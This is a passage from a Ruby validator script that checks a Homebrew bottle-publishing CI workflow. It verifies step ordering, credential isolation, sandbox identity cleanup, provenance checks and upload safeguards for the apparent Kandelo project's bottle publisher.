        verifier_temp_index < verifier_env_index &&
        verifier_env_index < verifier_created_index &&
        verifier_created_index < verifier_commit_index,
        "publisher commits verifier identity before its shared realm")
  verifier_native_api_step = check_native_api_freeze.call(
    verify_steps,
    "Freeze signed native Homebrew API for bottle verification",
    "runtime_and_test", "homebrew-native-api-verify",
    "publisher verifier"
  )
  force_pour_step = named_step(
    verify_steps, "Force-pour and test the exact selected bottle without credentials"
  )
  force_pour_run = force_pour_step.fetch("run")
  protected_sysroot_argument =
    '--sysroot-build-root "$GITHUB_WORKSPACE/kandelo-sysroot-build"'
  check(force_pour_run.scan(protected_sysroot_argument).length == 1 &&
        !force_pour_run.include?('--sysroot-build-root "$GITHUB_WORKSPACE/kandelo"') &&
        !force_pour_run.include?('--sysroot-build-root "$KANDELO_ROOT"'),
        "publisher verifier does not expose the isolated sysroot build through its exact root")
  check(verify_steps.index(verifier_sysroot_step) < verify_steps.index(force_pour_step),
        "publisher verifies a bottle before building its protected sysroot")
  verifier_retirement_step = named_step(
    verify_steps, "Retire isolated bottle verification identity"
  )
  check(verifier_retirement_step.keys.sort == %w[env if name run shell] &&
        verifier_retirement_step["if"] ==
          "${{ always() && steps.verifier-identity.outputs.created == 'true' }}" &&
        verifier_retirement_step["shell"] == "bash" &&
        verifier_retirement_step["env"] == {
          "ARCH" => "${{ matrix.arch }}",
          "FORMULA" => "${{ matrix.formula }}",
        }, "publisher verifier identity retirement mapping changed")
  verifier_retirement_run = verifier_retirement_step.fetch("run")
  [
    '[[ "$FORMULA" =~ ^[a-z0-9][a-z0-9+@._-]{0,254}$ ]]',
    '[[ "$ARCH" =~ ^wasm(32|64)$ ]]',
    '[[ "$KANDELO_HOMEBREW_SHARED_TEMP" ==',
    '/tmp/kandelo-homebrew-verify.*',
    'stat -c \'%u:%g:%a\' "$KANDELO_HOMEBREW_SHARED_TEMP"',
    '"0:0:1777"',
    'native_api_stem="$KANDELO_HOMEBREW_SHARED_TEMP/homebrew-native-api-verify-${FORMULA}-${ARCH}"',
    '"$KANDELO_HOMEBREW_SHARED_TEMP"/homebrew-native-api-verify-*',
    '"$sudo_bin" -n -- /usr/bin/rm -rf --',
    '"$native_api_stem-cache" "$native_api_stem-state"',
    '"$sudo_bin" -n -- /usr/bin/rm -f --',
    '"$native_api_stem-plan.json" "$native_api_stem-roots.txt"',
  ].each do |fragment|
    check(verifier_retirement_run.include?(fragment),
          "publisher verifier native API retirement lacks #{fragment}")
  end
  check(verify_steps.index(verifier_identity_step) <
          verify_steps.index(verifier_native_api_step) &&
        verify_steps.index(verifier_native_api_step) <
          verify_steps.index(verify_browser_step) &&
        verify_steps.index(verify_browser_step) < verify_steps.index(force_pour_step) &&
        verify_steps.index(force_pour_step) < verify_steps.index(verifier_retirement_step),
        "publisher provisions or uses the verifier browser outside the isolated test phase")
  build_formula_step = named_step(build_steps,
                                  "Build and test Homebrew bottle without publisher credentials")
  retire_identity_step = named_step(build_steps, "Retire isolated Formula execution identity")
  check(retire_identity_step.keys.sort == %w[env if name run shell] &&
        retire_identity_step["if"] ==
          "${{ always() && steps.formula-identity.outputs.created == 'true' }}" &&
        retire_identity_step["shell"] == "bash" &&
        retire_identity_step["env"] == {
          "ARCH" => "${{ matrix.arch }}",
          "FORMULA" => "${{ matrix.formula }}",
        },
        "publisher Formula execution identity retirement mapping changed")
  retire_identity_run = retire_identity_step.fetch("run")
  [
    '"$sudo_bin" -n -- "$pgrep_bin" -u "$uid"',
    '"$sudo_bin" -n -- "$pkill_bin" -KILL -u "$build_uid"',
    '"$sudo_bin" -n -- "$pkill_bin" -KILL -u "$recipe_uid"',
    '"$sudo_bin" -n -- "$userdel_bin" "$recipe_user"',
    '"$sudo_bin" -n -- "$userdel_bin" -r "$build_user"',
    "could not inspect isolated Homebrew processes",
    "isolated Homebrew identities still own live processes",
    "Homebrew identity still exists after retirement",
    '[[ "$FORMULA" =~ ^[a-z0-9][a-z0-9+@._-]{0,254}$ ]]',
    '[[ "$ARCH" =~ ^wasm(32|64)$ ]]',
    '[[ "$KANDELO_HOMEBREW_SHARED_TEMP" == /tmp/kandelo-homebrew.* ]]',
    'stat -c \'%u:%g:%a\' "$KANDELO_HOMEBREW_SHARED_TEMP"',
    '"0:0:1777"',
    'native_api_stem="$KANDELO_HOMEBREW_SHARED_TEMP/homebrew-native-api-${FORMULA}-${ARCH}"',
    '"$KANDELO_HOMEBREW_SHARED_TEMP"/homebrew-native-api-*',
    '"$sudo_bin" -n -- /usr/bin/rm -rf --',
    '"$native_api_stem-cache" "$native_api_stem-state"',
    '"$sudo_bin" -n -- /usr/bin/rm -f --',
    '"$native_api_stem-plan.json" "$native_api_stem-roots.txt"',
  ].each do |fragment|
    check(retire_identity_run.include?(fragment),
          "publisher Formula execution identity retirement lacks #{fragment}")
  end
  postbuild_kandelo_step = named_step(
    build_steps, "Checkout exact post-build Kandelo validator source"
  )
  postbuild_tap_step = named_step(build_steps, "Checkout exact post-build tap source")
  postbuild_campaign_step = named_step(
    build_steps, "Recreate sealed campaign source for post-build review"
  )
  source_closure_step = named_step(build_steps,
                                   "Recheck reviewed sources after Formula execution")
  source_closure_run = source_closure_step.fetch("run")
  [
    "scripts/homebrew-validate-formula-source-closure.sh",
    'cd "$GITHUB_WORKSPACE/kandelo-postbuild"',
    'git -C "$GITHUB_WORKSPACE/kandelo-postbuild" rev-parse HEAD',
    'git -C "$GITHUB_WORKSPACE/tap-reviewed" rev-parse HEAD',
    '--tap-root "$GITHUB_WORKSPACE/tap"', '--tap-repository "$TAP_REPOSITORY"',
    '--tap-name "$TAP_NAME"',
    '--formula "$FORMULA"', '--base-ref "$expected_tap_head"',
    '--reviewed-tap-root "$GITHUB_WORKSPACE/tap-reviewed"',
  ].each do |fragment|
    check(source_closure_run.include?(fragment),
          "publisher Formula source-closure check lacks #{fragment}")
  end
  resolved_taps_export =
    'export KANDELO_HOMEBREW_RESOLVED_TAPS_FILE="$resolved"'
  resolved_taps_persist =
    'echo "KANDELO_HOMEBREW_RESOLVED_TAPS_FILE=$resolved" >> "$GITHUB_ENV"'
  resolved_taps_use =
    'KANDELO_HOMEBREW_RESOLVED_TAPS_FILE="$KANDELO_HOMEBREW_RESOLVED_TAPS_FILE"'
  export_index = source_closure_run.index(resolved_taps_export)
  persist_index = source_closure_run.index(resolved_taps_persist)
  use_index = source_closure_run.index(resolved_taps_use)
  check(export_index && persist_index && use_index &&
        export_index < persist_index && persist_index < use_index,
        "publisher does not use the reviewed post-build tap map immediately")
  check(build_steps.index(kernel_step) < build_steps.index(fork_instrument_step) &&
        build_steps.index(fork_instrument_step) < build_steps.index(runtime_step) &&
        build_steps.index(runtime_step) < build_steps.index(javascript_step) &&
        build_steps.index(javascript_step) < build_steps.index(identity_step) &&
        build_steps.index(identity_step) < build_steps.index(build_native_api_step) &&
        build_steps.index(build_native_api_step) < build_steps.index(browser_step) &&
        build_steps.index(identity_step) < build_steps.index(browser_step) &&
        build_steps.index(browser_step) < build_steps.index(build_formula_step) &&
        build_steps.index(runtime_step) < build_steps.index(build_formula_step) &&
        build_steps.index(build_formula_step) < build_steps.index(retire_identity_step) &&
        build_steps.index(retire_identity_step) < build_steps.index(postbuild_kandelo_step) &&
        build_steps.index(retire_identity_step) < build_steps.index(postbuild_tap_step) &&
        build_steps.index(postbuild_tap_step) <
          build_steps.index(postbuild_campaign_step) &&
        build_steps.index(postbuild_kandelo_step) < build_steps.index(source_closure_step) &&
        build_steps.index(postbuild_campaign_step) <
          build_steps.index(source_closure_step) &&
        build_steps.index(postbuild_tap_step) < build_steps.index(source_closure_step) &&
        build_steps.index(build_formula_step) < build_steps.index(source_closure_step),
        "publisher Formula test runtime is materialized outside the unprivileged pre-test phase")
  create_handoff_step = named_step(
    build_steps, "Create strict bottle data handoff"
  )
  create_handoff_run = create_handoff_step.fetch("run")
  check(build_steps.index(source_closure_step) <
        build_steps.index(create_handoff_step),
        "publisher creates the bottle handoff before revalidating Formula sources")
  check(
    create_handoff_step.dig(
      "env", "KANDELO_HOMEBREW_PREFIX_CAMPAIGN_TAG"
    ) == "${{ needs.plan.outputs.prefix-campaign-tag }}",
    "publisher post-build campaign verifier lacks the selected tag"
  )
  [
    'if [ -n "${KANDELO_HOMEBREW_PREFIX_CAMPAIGN_RECEIPT:-}" ]',
    'cd "$GITHUB_WORKSPACE/kandelo-postbuild"',
    "python3 scripts/homebrew-prefix-campaign-publisher.py",
    "verify-built-bottle",
    '--tap-root "$GITHUB_WORKSPACE/tap-reviewed"',
    '--campaign-work-root "$campaign_work"',
    '"$KANDELO_HOMEBREW_PREFIX_CAMPAIGN_RECEIPT"',
    '"$KANDELO_HOMEBREW_PREFIX_CAMPAIGN_TAG"',
    '--bottle "$BOTTLE_ARCHIVE"',
    '--bottle-json "$BOTTLE_JSON"',
    '"$RUNNER_TEMP/homebrew-campaign-built-bottle.json"',
  ].each do |fragment|
    check(
      create_handoff_run.include?(fragment),
      "publisher post-build campaign verifier lacks #{fragment}"
    )
  end
  campaign_verify_index = create_handoff_run.index("verify-built-bottle")
  strict_handoff_index = create_handoff_run.index(
    "scripts/homebrew-create-build-handoff.sh"
  )
  check(
    campaign_verify_index && strict_handoff_index &&
      campaign_verify_index < strict_handoff_index,
    "publisher creates a handoff before campaign bottle verification"
  )
  [
    'cd "$GITHUB_WORKSPACE/kandelo-postbuild"',
    '. "$RUNNER_TEMP/homebrew-bottle/build.env"',
    "scripts/homebrew-create-build-handoff.sh", '--tap-repository "$KANDELO_HOMEBREW_TAP_REPOSITORY"',
    '--tap-name "$KANDELO_HOMEBREW_TAP_NAME"',
    '--bottle "$BOTTLE_ARCHIVE"', '--bottle-json "$BOTTLE_JSON"',
    '--dependency-provenance "$DEPENDENCY_PROVENANCE"',
    '--out "$RUNNER_TEMP/homebrew-build-handoff"',
  ].each do |fragment|
    check(create_handoff_run.include?(fragment), "publisher build handoff lacks #{fragment}")
  end
  check_forbidden_root_args(create_handoff_run, "publisher build handoff", [
    '--forbidden-root "$GITHUB_WORKSPACE"',
    '--forbidden-root "$(dirname "$GITHUB_WORKSPACE")"',
    '--forbidden-root "$RUNNER_TEMP"',
    '--forbidden-root "$KANDELO_HOMEBREW_SHARED_TEMP"',
    '--forbidden-root "$HOMEBREW_TEMP"',
    '--forbidden-root "$NATIVE_BUILD_ROOT"',
    '--forbidden-root "/home/$KANDELO_HOMEBREW_BUILD_USER"',
  ])
  compose_child = named_step(
    build_steps, "Compose deterministic Homebrew OCI child without credentials"
  )
  compose_child_run = compose_child.fetch("run")
  check(compose_child_run.scan(OCI_CROSS_TAP_COMPOSE_BOUNDARY).length == 1,
        "publisher OCI composition does not explicitly carry cross-tap authority")
  [
    "credential-free OCI composer received $secret_name",
    "scripts/homebrew-validate-build-handoff.sh",
    "scripts/homebrew-oci-layout.py build-child",
    '--tap-root "$GITHUB_WORKSPACE/tap-reviewed"',
    '--kandelo-root "$GITHUB_WORKSPACE/kandelo-postbuild"',
    '--out-layout "$artifact/layout"', '--out-receipt "$artifact/receipt.json"',
  ].each do |fragment|
    check(compose_child_run.include?(fragment),
          "publisher deterministic OCI child composition lacks #{fragment}")
  end
  check_forbidden_root_args(compose_child_run, "publisher OCI child composition", [
    '--forbidden-root "$GITHUB_WORKSPACE"',
    '--forbidden-root "$(dirname "$GITHUB_WORKSPACE")"',
    '--forbidden-root "$RUNNER_TEMP"',
    '--forbidden-root "/home/kandelo-homebrew-build"',
  ])
  check(build_steps.index(source_closure_step) < build_steps.index(compose_child) &&
        build_steps.index(named_step(build_steps, "Create strict bottle data handoff")) <
          build_steps.index(compose_child) &&
        build_steps.index(compose_child) <
          build_steps.index(named_step(build_steps, "Upload deterministic Homebrew OCI child")),
        "publisher composes or exports the OCI child outside the reviewed data phase")

  upload_validate = named_step(upload_steps,
                               "Validate build data before exposing upload credentials")
  upload_attempt = named_step(upload_steps, "Upload validated bottle in isolated ORAS auth state")
  check(upload_validate["id"] == "validate-build" &&
        upload_attempt["if"] == "${{ steps.validate-build.outcome == 'success' }}" &&
        upload_steps.index(upload_validate) < upload_steps.index(upload_attempt),
        "publisher exposes upload credentials before validating the handoff")
  check(upload_validate.fetch("run").include?("scripts/homebrew-validate-build-handoff.sh") &&
        upload_validate.fetch("run").include?('--tap-repository "$KANDELO_HOMEBREW_TAP_REPOSITORY"') &&
        upload_validate.fetch("run").include?('--tap-name "$KANDELO_HOMEBREW_TAP_NAME"') &&
        upload_attempt.fetch("run").include?("scripts/homebrew-ghcr-upload.sh") &&
        upload_attempt.fetch("run").include?('--tap-name "$KANDELO_HOMEBREW_TAP_NAME"') &&
        upload_attempt.fetch("run").include?(
          'upload_args+=(--exact-kandelo-main-sha \\'
        ) &&
        upload_attempt.fetch("run").include?(
          'upload_args+=(--kandelo-main-contains-sha \\'
        ) &&
        upload_attempt.fetch("run").include?(
          '--target-main-contains-sha "$KANDELO_HOMEBREW_TAP_COMMIT"'
        ) &&
        upload_attempt.fetch("run").include?(
          "require-exact-kandelo-main.sh"
        ) &&
        upload_attempt.fetch("run").include?(
          "require-repository-main-contains.sh"
        ) &&
        upload_attempt.fetch("run").include?("--auth-mode github-token") &&
        upload_attempt.fetch("run").include?("--require-pat false") &&
        upload_attempt.fetch("run").include?("--destination-mode repository") &&
        upload_attempt.fetch("run").include?('--out-json "$RUNNER_TEMP/homebrew-upload-receipt/receipt.json"'),
        "publisher isolated upload path changed")
  ghcr_uploader_source = File.read(File.join(REPO_ROOT, "scripts/homebrew-ghcr-upload.sh"))
  [
    'AUTH_MODE="automatic"',
    'REQUIRE_PAT="false"',
    'DESTINATION_MODE="repository"',
    'repository) REMOTE="ghcr.io/${NORMALIZED_TAP_REPOSITORY}/${FORMULA}" ;;',
    "--exact-kandelo-main-sha) EXACT_KANDELO_MAIN_SHA=",
    "--kandelo-main-contains-sha)",
    "--target-main-contains-sha)",
    "exact-main and main-contains authority are mutually exclusive",
    "exact-main or explicit main-contains authority is required before a GHCR mutation",
    "target main containment authority is required before a GHCR mutation",
    "target main authority does not match the validated layout receipt",
    'RECEIPT_TAP_REPOSITORY="$(jq -er \'.tap_repository\'',
    'RECEIPT_TAP_COMMIT="$(jq -er \'.tap_commit\'',
    'RECEIPT_TAP_REPOSITORY="$(jq -er \'.authority.tap_repository\'',
    'RECEIPT_TAP_COMMIT="$(jq -er \'.authority.tap_commit\'',
    'bash "$SCRIPT_ROOT/../.github/scripts/require-exact-kandelo-main.sh"',
    '--source-sha "$EXACT_KANDELO_MAIN_SHA"',
    '"$SCRIPT_ROOT/../.github/scripts/require-repository-main-contains.sh"',
    '--source-sha "$KANDELO_MAIN_CONTAINS_SHA"',
    '--repository "$RECEIPT_TAP_REPOSITORY"',
    '--source-sha "$RECEIPT_TAP_COMMIT"',
  ].each do |fragment|
    check(ghcr_uploader_source.include?(fragment),
          "publisher GHCR transport lacks #{fragment}")
  end
  check(!ghcr_uploader_source.include?(
          'tap) REMOTE="ghcr.io/${TAP_NAME}/${FORMULA}"'
        ), "publisher GHCR transport retains a tap-name-rooted production destination")
  trusted_runner_roots = [
    '--forbidden-root "$GITHUB_WORKSPACE"',
    '--forbidden-root "$(dirname "$GITHUB_WORKSPACE")"',
    '--forbidden-root "$RUNNER_TEMP"',
    '--forbidden-root "/home/kandelo-homebrew-build"',
  ]
  check_forbidden_root_args(upload_validate.fetch("run"),
                            "publisher uploader handoff validation", trusted_runner_roots)
  upload_receipt_validation = named_step(upload_steps, "Revalidate upload receipt as data")
  upload_receipt_validation_run = upload_receipt_validation.fetch("run")
  check(upload_receipt_validation_run.include?("bash scripts/dev-shell.sh env \\") &&
        upload_receipt_validation_run.include?(resolved_taps_forwarding),
        "publisher uploader receipt validation drops immutable resolved taps at the dev-shell boundary")
  check_forbidden_root_args(upload_receipt_validation_run,
                            "publisher uploader receipt validation", trusted_runner_roots)
  build_handoff_validator = File.read(
    File.join(REPO_ROOT, "scripts/homebrew-validate-build-handoff.sh")
  )
  inspector_call = 'python3 "$SCRIPT_ROOT/homebrew-inspect-bottle.py"'
  output_start = 'if [ -n "$OUT_BOTTLE_JSON" ]; then'
  check(build_handoff_validator.include?(inspector_call) &&
        build_handoff_validator.include?('--expected-abi "$EXPECTED_ABI"') &&
        build_handoff_validator.include?('--expected-arch "$ARCH"') &&
        build_handoff_validator.include?('inspection_args+=(--forbidden-root "$forbidden_root")') &&
        build_handoff_validator.include?(
          "bottle receipt runtime dependencies do not match validated dependency provenance"
        ) &&
        build_handoff_validator.index(inspector_call) < build_handoff_validator.index(output_start),
        "publisher handoff validation does not inspect bottle archives before producing uploader data")
  dependency_provenance = File.read(
    File.join(REPO_ROOT, "scripts/homebrew-dependency-provenance.py")
  )
  runtime_evidence = File.read(
    File.join(REPO_ROOT, "scripts/homebrew-bottle-runtime-evidence.py")
  )
  cache_archive = File.read(
    File.join(REPO_ROOT, "scripts/homebrew_cache_archive.py")
  )
  [
    'args.dependency_tap_root',
    'parser.add_argument("--dependency-tap-root", required=True)',
  ].each do |fragment|
    check(runtime_evidence.include?(fragment),
          "publisher runtime evidence drops the clean dependency tap root: #{fragment}")
  end
  [
    '"--bottle-test-contract-json"',
    '"contract": "support-data"',
    '"runtime": "homebrew"',
    '"schema": 5',
    "legacy runtime evidence cannot satisfy a support-data test contract",
    "support-data Formula test unexpectedly emitted Node execution evidence",
  ].each do |fragment|
    check(runtime_evidence.include?(fragment),
          "publisher runtime evidence weakens typed Formula tests: #{fragment}")
  end
  [
    "contexts = resolved_tap_contexts(args)",
    "context = contexts.get(dependency_tap)",
    "if context is None:",
    'f"target receipt runtime dependency {full_name!r} is outside immutable resolved taps"',
    'source.get("tap_git_head") != context["checkout_commit"]',
    'formula_path = pathlib.Path(context["root"]) / "Formula" / f"{name}.rb"',
    'dependency_root_url = context["bottle_root_url"]',
  ].each do |fragment|
    check(dependency_provenance.include?(fragment),
          "publisher dependency provenance allows external target receipts: #{fragment}")
  end
  [
    'if "bottle_rebuild" not in dependency:',
    'return None',
    'rebuild = dependency["bottle_rebuild"]',
    'or isinstance(rebuild, bool)',
    '"a non-negative integer when present"',
    'receipt_bottle_rebuild = target_receipt_bottle_rebuild(dependency, full_name)',
    'if receipt_bottle_rebuild is not None and rebuild != receipt_bottle_rebuild:',
  ].each do |fragment|
    check(dependency_provenance.include?(fragment),
          "publisher dependency provenance weakens receipt rebuild validation: #{fragment}")
  end
  [
    '":any": "any"',
    '":any_skip_relocation": "any_skip_relocation"',
    'cellar = BREW_INFO_SYMBOLIC_CELLARS.get(cellar, cellar)',
    'if cellar not in bottle_cellars:',
    'bottle_cellar = normalized_brew_info_cellar(',
    "bottle_cellars,",
  ].each do |fragment|
    check(dependency_provenance.include?(fragment),
          "publisher dependency provenance weakens brew info cellar normalization: #{fragment}")
  end
  [
    'def public_manifest_url(',
    'reference = f"{version}-{rebuild}" if rebuild else version',
    'return f"{bottle_root_url}/{dependency}/manifests/{reference}"',
    'def line_fetches_reference(line: str, references: tuple[str, ...]) -> bool:',
    'return match is not None and match.group(1) in references',
    'fetch_references = (bottle_url, bottle_manifest_url)',
    'if line_fetches_reference(line, fetch_references):',
    'validate_fetch_evidence(',
    '(bottle["url"], bottle_manifest_url)',
  ].each do |fragment|
    check(dependency_provenance.include?(fragment),
          "publisher dependency provenance weakens exact manifest fetch evidence: #{fragment}")
  end
  [
    'MAX_BOTTLE_BYTES = 2_147_483_648',
    'def hash_exact_cached_archive(',
    'flags |= os.O_NOFOLLOW',
    'if before_path.st_nlink != 1:',
    'if resolved_cache != cache_root:',
    'resolved_downloads != downloads',
    'archive.parent != resolved_downloads',
    '_stable_file_identity(after_path) != identity',
    'url_sha256 = hashlib.sha256(bottle_url.encode("utf-8")).hexdigest()',
    'def hash_exact_local_archive(',
    'def validate_archive_record(',
  ].each do |fragment|
    check(cache_archive.include?(fragment),
          "publisher shared cache-archive evidence weakens #{fragment}")
  end
  [
    'from homebrew_cache_archive import (',
    '"--cache",',
    'f"--bottle-tag={expected_tag}",',
    'if archive["sha256"] != bottle["sha256"]:',
    'if root["schema"] in (6, 7):',
    'if archive["sha256"] != bottle_sha:',
    'if root["schema"] not in (6, 7):',
  ].each do |fragment|
    check(dependency_provenance.include?(fragment),
          "publisher dependency provenance weakens machine cache evidence: #{fragment}")
  end
  [
    'from homebrew_cache_archive import (',
    'hash_exact_cached_archive(',
    'hash_exact_local_archive(',
    'archive["source"] = "homebrew-cache"',
    'archive["source"] = "local-input"',
    '"schema": 5',
    'if schema == 5:',
    'validate_archive_record(',
  ].each do |fragment|
    check(runtime_evidence.include?(fragment),
          "publisher runtime evidence weakens machine archive evidence: #{fragment}")
  end
  [
    'def exact_git_head(root: pathlib.Path, label: str) -> str:',
    'def formulae_equivalent_excluding_bottle(',
    '"--equivalent-excluding-bottle",',
    'if not validation_tap_root:',
    'fail("planned tap root requires a current tap root")',
    'planned_head = exact_git_head(planned_root, "planned tap root")',
    'if planned_head != contexts[normalized_tap]["checkout_commit"]:',
    'if planned_root is not None and dependency_tap == normalized_tap:',
    'if sha256_file(planned_formula_path) != formula["sha256"]:',
    'Formula digest differs from the planned tap',
    'if current_formula_sha != formula["sha256"]:',
    'elif current_formula_sha != formula["sha256"]:',
    'Formula differs from the planned tap outside canonical bottle metadata',
    'validate_parser.add_argument("--planned-tap-root")',
  ].each do |fragment|
    check(dependency_provenance.include?(fragment),
          "publisher dependency drift validation lacks #{fragment}")
  end
  [
    'immutable_root = root_path.resolve()',
    '["git", "-C", str(immutable_root), "rev-parse", "HEAD"]',
    '["git", "-C", str(immutable_root), "status", "--short", "--untracked-files=all"]',
    'status.returncode != 0 or (index != 0 and status.stdout)',
    'fail(f"resolved tap {tap_name} has working-tree changes")',
    'def exact_clean_git_root_head(root: pathlib.Path, label: str) -> str:',
    '["git", "-C", str(resolved_root), "rev-parse", "--show-toplevel"]',
    '"--untracked-files=all",',
    'fail(f"{label} must be the exact Git worktree root")',
    'fail(f"{label} has working-tree changes")',
    'return exact_git_head(resolved_root, label)',
    'def require_git_ancestor(',
    '["git", "-C", str(root), "merge-base", "--is-ancestor", ancestor, descendant]',
    'fail(f"{label} HEAD is not a descendant of planned tap commit {ancestor}")',
    'current_head = exact_clean_git_root_head(',
    'context_root = primary_root',
    '"root": context_root',
  ].each do |fragment|
    check(dependency_provenance.include?(fragment),
          "publisher refreshed-primary validation lacks #{fragment}")
  end
  override_check = dependency_provenance.index('current_head = exact_clean_git_root_head(')
  override_assignment = dependency_provenance.index('context_root = primary_root')
  check(override_check && override_assignment && override_check < override_assignment,
        "publisher replaces the primary tap root before validating its clean ancestry")
  check(upload_steps.none? { |step| step["name"].to_s.downcase.include?("diagnostic") } &&
        upload_steps.count { |step| step["uses"] == UPLOAD_ACTION } == 1,
        "credentialed uploader publishes diagnostics")

  index_validate = named_step(
    index_steps, "Validate child layouts and public publication evidence without credentials"
  )
  index_import = named_step(
    index_steps, "Import the existing public Homebrew version index anonymously"
  )
  index_compose = named_step(
    index_steps, "Compose one complete Homebrew version index without credentials"
  )
  index_publish = named_step(
    index_steps, "Publish the complete Homebrew version index in isolated ORAS auth state"
  )
  index_validate_run = index_validate.fetch("run")
  [
    "credential-free index input validator received $secret_name",
    "scripts/homebrew-index-artifact-paths.sh",
    '--kind child', '--kind publication',
    "OCI child and public receipt counts differ",
    "missing or ambiguous public child publication receipt",
    "public child publication receipt was reused",
    "scripts/homebrew-oci-layout.py validate-child",
    "validate-publication-receipt", '--kind child',
    'printf \'%s\\0%s\\0\'',
  ].each do |fragment|
    check(index_validate_run.include?(fragment),
          "publisher version-index input validation lacks #{fragment}")
  end
  child_validation_index = index_validate_run.index(
    "scripts/homebrew-oci-layout.py validate-child"
  )
  child_arch_index = index_validate_run.index('arch="$(jq -er \'.arch\' "$receipt")"')
  check(child_validation_index && child_arch_index && child_validation_index < child_arch_index,
        "publisher trusts a child receipt architecture before validating its OCI layout")
  topology_helper = File.read(
    File.join(REPO_ROOT, "scripts/homebrew-index-artifact-paths.sh")
  )
  [
    'if [ -e "$ROOT/receipt.json" ] || [ -L "$ROOT/receipt.json" ]',
    'fail "flattened receipt is not a regular file"',
    'fail "nested artifact directory has an unexpected name"',
    'fail "nested receipt is not a regular file"',
    'fail "nested artifact download has an invalid receipt count"',
    'fail "artifact download has an invalid receipt count"',
  ].each do |fragment|
    check(topology_helper.include?(fragment),
          "publisher index artifact topology helper lacks #{fragment}")
  end
  index_import_run = index_import.fetch("run")
  check(index_import.keys.sort == %w[env id name run shell] &&
        index_import["id"] == "existing-index" && index_import["shell"] == "bash" &&
        index_import["env"] == {
          "KANDELO_HOMEBREW_FORMULA" => "${{ matrix.formula }}",
          "KANDELO_HOMEBREW_TAP_REPOSITORY" => "${{ inputs.tap-repository }}",
          "KANDELO_HOMEBREW_TAP_NAME" => "${{ inputs.tap-name }}",
        }, "publisher anonymous version-index import mapping changed")
  repository_remote =
    'remote="ghcr.io/${tap_repository}/${KANDELO_HOMEBREW_FORMULA}"'
  [
    "anonymous index import received $secret_name",
    "scripts/homebrew-oci-layout.py import-public-index",
    'tap_repository="$(printf \'%s\' "$KANDELO_HOMEBREW_TAP_REPOSITORY" | tr \'[:upper:]\' \'[:lower:]\')"',
    repository_remote,
    '--remote "$remote"', '--reference "$top_ref"',
    '--registry-config "$anonymous_config"', '--out-layout "$existing"',
    '--out-result "$result"',
    'keys == ["digest", "layout", "schema", "status"]',
    'keys == ["schema", "status"]',
  ].each do |fragment|
    check(index_import_run.include?(fragment),
          "publisher anonymous version-index import lacks #{fragment}")
  end
  check(index_import_run.scan(repository_remote).length == 1 &&
        !index_import_run.include?('remote="ghcr.io/${tap_name}/'),
        "publisher anonymous version-index import is not repository-rooted")
  check((credential_names & index_import_run.scan(/[A-Z][A-Z0-9_]+/)).all? do |name|
    index_import_run.include?("-u #{name}") || index_import_run.include?("$secret_name")
  end, "publisher anonymous version-index import references an available credential")
  index_import_tool = File.read(File.join(REPO_ROOT, "scripts/homebrew-oci-layout.py"))
  [
    'commands.add_parser("probe-public-index")',
    'commands.add_parser("import-public-index")',
    'def observe_public_index(',
    'target = f"{remote}:{reference}"',
    'descriptor=True',
    'target=f"{remote}@sha256:{digest}"',
    'MAX_BOTTLE_BYTES',
    'run_bounded_command(',
    '"oras", "blob", "fetch", "--descriptor"',
    'resolve_remote_blob_descriptor(',
    'f"{remote}@sha256:{top_digest}"',
    '"--to-oci-layout"',
    'def run_oras_blob_fetch(',
    'blob=True',
    'load_homebrew_index_root(output_layout, expected_root)',
    'output_layout / "index.json"',
    '"manifests": [expected_root]',
    'untagged Homebrew child set',
  ].each do |fragment|
    check(index_import_tool.include?(fragment),
          "trusted anonymous version-index importer lacks #{fragment}")
  end
  [
    'def top_semantics_from_annotations(',
    'def exact_clean_git_head(',
    'def authorize_unfinalized_recovery(',
    'def canonical_tap_document(',
    'def validate_finalized_bottle(',
    'def validate_finalized_predecessor(',
    'expected_checkout = tap_checkout_commit or receipt["tap_commit"]',
    "if head != expected_checkout:",
    'if expected_checkout != receipt["tap_commit"]:',
    '"merge-base",',
    '"--is-ancestor",',
    'tap Formula sidecar and aggregate metadata do not agree on',
    'tap aggregate Homebrew package differs from its Formula',
    'tap Formula sidecar already finalizes this or a newer rebuild',
    'existing_semantics = top_semantics_from_annotations(',
    'existing_layout, descriptor, existing_semantics',
    '"dev.kandelo.homebrew.tap_repository",',
    'unfinalized recovery cannot change the fixed',
    'conflicting_refs = [',
    '"unfinalized-same-identity-child-replacement"',
    '"unfinalized-stale-source-identity"',
  ].each do |fragment|
    check(index_import_tool.include?(fragment),
          "trusted unfinalized version-index recovery lacks #{fragment}")
  end
  publication_limits = File.read(
    File.join(REPO_ROOT, "scripts/homebrew-publication-limits.sh")
  )
  bottle_inspector = File.read(
    File.join(REPO_ROOT, "scripts/homebrew-inspect-bottle.py")
  )
  public_bottle_verifier = File.read(
    File.join(REPO_ROOT, "scripts/homebrew-verify-public-bottle.ts")
  )
  bottle_fetch = File.read(
    File.join(REPO_ROOT, "host/src/homebrew-vfs-fetch.ts")
  )
  prefix_campaign = File.read(
    File.join(REPO_ROOT, "scripts/homebrew-prefix-campaign.py")
  )
  check(publication_limits.include?(
          "readonly HOMEBREW_MAX_COMPOSITION_INPUT_BYTES=8388608"
        ) &&
        publication_limits.include?(
          "readonly HOMEBREW_MAX_SIDECAR_JSON_BYTES=16777216"
        ) &&
        publication_limits.include?(
          "readonly HOMEBREW_MAX_FAILURE_ERROR_BYTES=2048"
        ) &&
        publication_limits.include?(
          "readonly HOMEBREW_MAX_FAILURE_ERROR_DETAIL_BYTES=16384"
        ) &&
        publication_limits.include?("readonly HOMEBREW_MAX_BOTTLE_BYTES=2147483648") &&
        publication_limits.include?(
          "readonly HOMEBREW_MAX_EXPANDED_BOTTLE_BYTES=17179869184"
        ) &&
        index_import_tool.include?('MAX_EXPANDED_BOTTLE_BYTES') &&
        index_import_tool.include?('publication_limits()') &&
        bottle_inspector.include?('publication_archive_limits()') &&
        bottle_inspector.include?('"$HOMEBREW_MAX_BOTTLE_BYTES"') &&
        bottle_inspector.include?('"$HOMEBREW_MAX_EXPANDED_BOTTLE_BYTES"') &&
        !bottle_inspector.include?('MAX_COMPRESSED_BYTES = 2 * 1024') &&
        !bottle_inspector.include?('MAX_ARCHIVE_BYTES = 16 * 1024'),
        "trusted publication limits or OCI archive bounds changed")
  check(public_bottle_verifier.include?(
          "MAX_COMPRESSED_BOTTLE_BYTES = loadCompressedBottleLimit()"
        ) &&
        public_bottle_verifier.include?("homebrew-publication-limits.sh") &&
        public_bottle_verifier.include?("fetchHomebrewBottleResponse") &&
        public_bottle_verifier.include?('open(options.out, "wx", 0o644)') &&
        public_bottle_verifier.include?('createHash("sha256")') &&
